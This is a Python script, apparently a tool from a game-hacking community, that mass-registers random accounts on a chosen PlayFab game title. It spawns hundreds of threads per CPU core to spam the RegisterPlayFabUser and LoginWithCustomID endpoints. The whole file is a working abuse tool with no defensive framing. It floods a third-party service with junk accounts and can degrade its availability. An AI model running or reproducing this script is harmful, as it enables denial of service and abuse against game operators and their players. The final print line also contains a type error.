# By Kokuri/Freddy
import requests, random, string, os
from concurrent.futures import ThreadPoolExecutor, as_completed
TITLE = input("TitleId: ")
COUNT = 50
CHARS = string.ascii_letters + string.digits
URL = f"https://{TITLE}.playfabapi.com/Client/RegisterPlayFabUser"
URL2 = f"https://{TITLE}.playfabapi.com/Client/LoginWithCustomID"
PASS = ''.join(random.choice(CHARS) for _ in range(23))
SUCCESS = 0
def spam():
    LOCAL = 0
    for i in range(COUNT):
        RAND = ''.join(random.choice(CHARS) for _ in range(8))
        DATA = {
            "TitleId": TITLE,
            "Username": RAND,
            "Password": PASS + RAND,
            "RequireBothUsernameAndEmail": False,
            "CreateAccount": True,
            "CustomId": RAND
        }
        RES = requests.post(URL, headers={"Content-Type": "application/json"}, json=DATA)
        RAND2 = ''.join(random.choice(CHARS) for _ in range(8))
        DATA2 = {
            "TitleId": TITLE,
            "CustomId": RAND2,
            "DisplayName": RAND2,
            "CreateAccount": True
        }
        RES2 = requests.post(URL2, headers={"Content-Type": "application/json", "X-PlayFabSDK": "PythonSdk-0.0.220411", "X-ReportErrorAsSuccess": "true"}, json=DATA2)
        if RES.status_code == 200:
                LOCAL += 1
                print(LOCAL)
        if RES2.status_code == 200:
                LOCAL += 1
                print(LOCAL)
    return LOCAL

with ThreadPoolExecutor(max_workers=os.cpu_count() * 100) as executor:
    futures_list = [executor.submit(spam) for _ in range(os.cpu_count() * 100)]
    for future in as_completed(futures_list):
        SUCCESS += future.result()
print(SUCCESS + " (likely /2)")
